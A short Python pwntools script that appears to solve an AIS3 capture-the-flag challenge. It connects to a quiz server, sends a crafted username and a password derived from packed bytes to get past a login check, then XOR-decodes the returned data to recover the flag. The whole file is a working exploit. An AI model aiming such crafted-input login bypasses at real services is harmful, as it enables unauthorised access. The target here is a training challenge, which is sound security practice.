from pwn import *

io = remote('quiz.ais3.org', 56746)

io.sendlineafter('Username : ', '!' * 24)
io.sendlineafter('Password : ', str(u32('!' * 4)))
io.sendlineafter('choice :', '1')
io.recvuntil('Magic : ')
flag = io.recvall()
flag = xor(flag, xor(flag[0], 'a'))
print(flag)
